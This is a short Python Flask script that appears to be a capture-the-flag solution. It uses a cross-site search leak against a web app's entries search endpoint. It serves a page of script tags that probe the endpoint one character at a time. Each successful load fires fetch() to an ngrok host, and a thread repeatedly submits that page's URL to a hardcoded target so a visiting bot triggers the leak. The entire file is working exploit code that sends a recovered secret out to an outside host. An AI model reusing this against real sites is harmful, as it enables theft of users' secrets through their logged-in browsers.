from threading import Thread
from time import sleep
from flask import Flask
import string
from icecream import ic
import requests

# host = 'http://localhost:1337'
host = 'http://178.128.37.153:30245'
ngrok_host = 'http://6d29-125-239-70-125.ngrok.io'

current_progress = ''


app = Flask(__name__)

@app.route('/bruteforce')
def bruteforce():
    source = "<html><body>"
    for c in string.printable:
        if c in '%&_ ':
            continue
        source += (
            f'<script'
            f'    src="http://127.0.0.1:1337/api/entries/search?q={current_progress}{c}"'
            f'    onload="fetch(\'{ngrok_host}/success/{current_progress}{c}\')"'
            # f'    onerror="fetch(\'{ngrok_host}/fail/{current_progress}{c}\')"'
            f'></script>'
        )
    source += "</body></html>"

    return source

    
@app.route('/success/<progress>')
def success(progress: str):
    print(f'Success: {progress}')
    
    global current_progress
    if len(progress) > len(current_progress):
        current_progress = progress
        ic(progress)
    return ""

@app.route('/fail/<progress>')
def fail(progress: str):
    print(f'Fail: {progress}')
    return "", 404


def trigger():
    global current_progress
    while True:
        last_progress = current_progress
        print(f'Triggering {current_progress}')
        requests.post(f'{host}/api/entries', json={
            'url': f'{ngrok_host}/bruteforce'
        })

        i = 0
        while current_progress == last_progress:
            sleep(0.1)
            i += 1
            if i > 100:
                current_progress += '_'

Thread(target=trigger, daemon=True).start()

app.run('0.0.0.0', 8001)



